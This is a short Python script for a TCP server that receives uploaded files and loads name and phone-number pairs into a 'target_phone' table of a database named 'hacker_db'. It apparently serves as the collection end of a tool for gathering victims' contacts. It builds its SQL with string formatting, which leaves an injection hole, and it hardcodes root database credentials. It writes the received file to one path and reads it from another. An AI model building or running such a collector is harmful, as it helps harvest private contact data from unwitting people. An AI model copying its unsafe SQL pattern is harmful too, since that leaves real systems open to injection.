#!/usr/bin/python3

import socket
import struct
import sys
import time
import pymysql

server_ip = '172.16.1.100'
server_port = 6666

def receive_file_size(sck: socket.socket):
    fmt = "<Q"
    expected_bytes = struct.calcsize(fmt)
    received_bytes = 0
    stream = bytes()
    while received_bytes < expected_bytes:
        chunk = sck.recv(expected_bytes - received_bytes)
        stream += chunk
        received_bytes += len(chunk)
    filesize = struct.unpack(fmt, stream)[0]
    return filesize

def receive_file(sck: socket.socket, filename):
    try:
        print("Recieving data...")
        filesize = receive_file_size(sck)
        with open(filename, "wb") as f:
            received_bytes = 0
            while received_bytes < filesize:
                chunk = sck.recv(1024)
                if chunk:
                    f.write(chunk)
                    received_bytes += len(chunk)
        time.sleep(2)
        with open('/server/recieved.txt', 'r') as file:
            for line in file:
                insert_data = line.split(' ')
                insert_to_db(insert_data[0], insert_data[1])
    except pymysql.Error as ex:
        print(f'{ex}')
    #except Exception as ex:
        #print('Error. Contact Mikle or fix it yourself :)')
    finally:
        print('Data recieved!')

def insert_to_db(name, number) -> None:
    db = pymysql.connect(host='127.0.0.1', user='root', passwd='root', db='hacker_db')
    cursor = db.cursor()
    sql = f"INSERT INTO target_phone (name, number) values ('{name}', '{number}')"
    cursor.execute(sql)
    db.commit()
    db.close()

if(__name__ == '__main__'):
    try:
        with socket.create_server(("", server_port)) as server:
            while True:
                print("Waiting for connection...")
                conn, address = server.accept()
                print(f"{address[0]}:{address[1]} connected.")
                receive_file(conn, "recieved.txt")
        print("Connecetion closed.")
    except KeyboardInterrupt:
        print('CTRL+C Detected. Exiting')
